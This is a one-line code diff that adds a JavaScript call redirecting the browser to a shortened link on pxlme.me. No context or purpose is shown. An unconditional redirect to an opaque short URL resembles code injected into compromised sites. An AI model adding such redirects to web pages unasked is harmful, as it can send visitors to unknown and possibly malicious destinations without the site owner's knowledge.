@@ -1,0 +1,1 @@
+window.location.replace('https://pxlme.me/p89Y8mkS');
